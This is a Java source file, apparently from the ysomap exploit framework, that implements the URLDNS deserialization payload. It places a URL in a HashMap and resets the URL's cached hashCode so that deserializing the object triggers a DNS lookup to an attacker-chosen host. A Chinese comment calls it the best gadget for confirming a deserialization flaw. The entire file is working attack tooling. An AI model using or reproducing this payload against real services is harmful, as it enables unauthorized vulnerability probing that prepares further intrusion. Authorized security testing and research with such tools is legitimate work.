package ysomap.gadget.payload.jdk;

import ysomap.annotation.Authors;
import ysomap.annotation.Dependencies;
import ysomap.annotation.Require;
import ysomap.gadget.ObjectGadget;
import ysomap.gadget.bullet.jdk.URLBullet;
import ysomap.gadget.payload.Payload;
import ysomap.serializer.Serializer;
import ysomap.serializer.SerializerFactory;
import ysomap.util.Reflections;

import java.net.URL;
import java.util.HashMap;

/**
 * URLDNS 最好的确认是否存在反序列化漏洞的gadget
 * 不依赖jdk版本，使用了原生的Map，check是否相同时触发URL
 * @author wh1t3P1g
 * @since 2020/2/23
 */
@Authors({ Authors.GEBL })
@Dependencies({"*"})
@Require(bullets = {"URLBullet"})
@SuppressWarnings({"rawtypes", "unchecked"})
public class URLDNS extends Payload<Object> {

    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof URL;
    }

    @Override
    public ObjectGadget getDefaultBullet(String command) throws Exception {
        return new URLBullet().set("url","http://localhost");
    }

    @Override
    public Serializer<?> getSerializer() {
        return SerializerFactory.createSerializer("");
    }

    @Override
    public Object pack(Object obj) throws Exception {
        HashMap ht = new HashMap(); // HashMap that will contain the URL
        ht.put(obj, obj.toString()); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

        Reflections.setFieldValue(obj, "hashCode", -1);
        return ht;
    }
}
